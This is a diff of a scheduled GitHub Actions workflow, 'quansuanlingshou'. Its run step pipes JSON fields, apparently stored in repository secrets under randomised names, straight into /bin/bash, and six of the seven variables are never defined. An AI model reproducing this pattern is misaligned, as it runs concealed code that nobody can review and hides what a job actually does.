@@ -2,16 +2,22 @@ name: quansuanlingshou
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 5/6 * * *'
-jobs:  # 11353
+    - cron: '40 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: quansuanlingshou
         env:
-          i05: ${{ secrets.i05 }}
+          evcod24: ${{ secrets.evcod24 }}
         run: |
-          echo $i05 | jq -r .qjfds43 | /bin/bash
-          echo $bij83 | jq -r .t59 | /bin/bash
+          echo $evcod24 | jq -r .fxz1044 | /bin/bash
+          echo $cccjn5894 | jq -r .ylhdu19 | /bin/bash
+          echo $ujc04408 | jq -r .ddup258 | /bin/bash
+          echo $ojouu12 | jq -r .azcqo83 | /bin/bash
+          echo $c0294 | jq -r .wo3 | /bin/bash
+          echo $bpvwq061 | jq -r .rbjx86 | /bin/bash
+          echo $uzib4637 | jq -r .gyaju966 | /bin/bash
 
